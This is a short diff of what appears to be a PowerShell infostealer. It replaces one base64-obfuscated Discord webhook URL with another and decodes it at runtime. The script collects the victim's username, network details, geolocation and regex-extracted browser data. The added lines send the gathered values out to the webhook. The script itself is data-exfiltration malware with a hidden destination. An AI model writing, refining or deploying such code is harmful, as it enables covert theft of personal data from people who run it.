@@ -118,7 +118,7 @@ $Networks = Out-String -InputObject $Networks
 
 $Lat, $Lon = Get-GeoLocation
 
-$B64webhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA2MDczMDE4MzEwMDk0NDQ4NS9nd3l0U09wTEhLWFlTTTJtQ29XRlhQS3IwYTNHMTFMR2kwck9sTGRLT2NmcEdrSE1KWkhlVGFZUjBtS290cDl1WUE5ZQ=="
+$B64webhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA2MDcyNzg4NjAyNzQyODAyMS9iM1lMRnhkXzVrRmhfdC1ja1pDSDhTakkxRUZibHRqTnExeThraVhtTkdjUHdhcF9oQXhsekVFTklZaDBMbS1XRnhyXw=="
 
 $link = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($B64webhook))
 
@@ -132,8 +132,6 @@ $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matc
 $array = New-Object Collections.Generic.List[String]
 $counter = 0
 Upload-Discord -text $env:UserName -hook $link
-Upload-Discord -text $Browser -hook $link
-Upload-Discord -text $DataType -hook $link
 $Value | ForEach-Object {
 	$counter += 1
 	$Key = $_
@@ -155,3 +153,5 @@ $Value | ForEach-Object {
 	}
 	
 }
+
+Discord-Upload -text $array -hook $link
